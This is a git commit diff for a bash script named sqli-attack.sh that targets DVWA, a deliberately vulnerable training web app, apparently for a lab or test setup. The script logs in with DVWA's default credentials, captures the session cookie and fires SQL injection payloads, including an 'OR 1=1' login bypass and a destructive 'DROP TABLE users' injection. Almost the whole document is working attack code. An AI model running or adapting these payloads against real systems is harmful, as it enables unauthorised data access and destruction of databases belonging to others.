83709026bf5ea96676d21d8e26281822ee97e856
Incogn1toBro <griffen-0@hotmail.com>
2026-03-15 15:08:50 +1100

    Update sqli-attack.sh

--- infra/attack-scripts/sqli-attack.sh
+++ infra/attack-scripts/sqli-attack.sh
@@ -1,6 +1,24 @@
 #!/bin/bash
-TARGET="INSERT DVWA IP:8080"
+
+TARGET="INSERT DVWA IP HERE:8080"
+USERNAME="admin"
+PASSWORD="password"
+COOKIE_JAR="/tmp/dvwa_cookies.txt"
+
+echo "=== Logging into DVWA ==="
+curl -s -c "$COOKIE_JAR" "http://$TARGET/login.php" > /dev/null
+
+curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
+  -d "username=$USERNAME&password=$PASSWORD&Login=Login" \
+  "http://$TARGET/login.php" > /dev/null
+
+PHPSESSID=$(grep PHPSESSID "$COOKIE_JAR" | awk '{print $NF}')
+echo "Got PHPSESSID: $PHPSESSID"
 
 echo "=== SQL Injection Attacks ==="
-curl -s "http://$TARGET/vulnerabilities/sqli/?id=1' OR 1=1--" | grep -i user
-curl -s "http://$TARGET/vulnerabilities/sqli/?id=1; DROP TABLE users--" | grep -i error
+
+curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+" \
+  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i user
+
+curl -s "http://$TARGET/vulnerabilities/sqli/?id=1%3B+DROP+TABLE+users--" \
+  -b "PHPSESSID=$PHPSESSID; security=low" | grep -i error
